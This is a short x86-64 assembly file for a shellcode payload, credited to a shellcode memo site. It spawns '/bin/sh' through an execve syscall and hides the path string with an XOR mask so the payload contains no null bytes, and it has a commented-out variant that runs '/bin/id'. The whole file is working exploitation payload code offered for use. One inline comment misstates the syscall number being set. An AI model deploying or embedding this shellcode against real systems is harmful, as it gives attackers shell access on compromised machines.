; Kudos to https://masterccc.github.io/memo/shellcode/ 

global _start

SECTION .text

_start:

  xor rdx,rdx ; env
  xor rsi,rsi ; args
  
  
  mov rax, 0xff978cd091969dd0 ; "/bin/sh XOR 0xffffffffffffffff"
  ;mov rax, 0xff9b96d091969dd0 ; "/bin/id XOR 0xffffffffffffffff"
  
  xor rax, 0xffffffffffffffff ; XOR 0xffffffffffffffff
  push rax
  mov rdi,rsp
  
  xor eax,eax  ; Set EAX to 0x0
  mov al, 0x3b ; Set AL to 0x0
  
  syscall

; Quit
  mov  rbx,0       ; return code
  mov  rax,1       ; exit syscall number
  int  0x80        ; syscall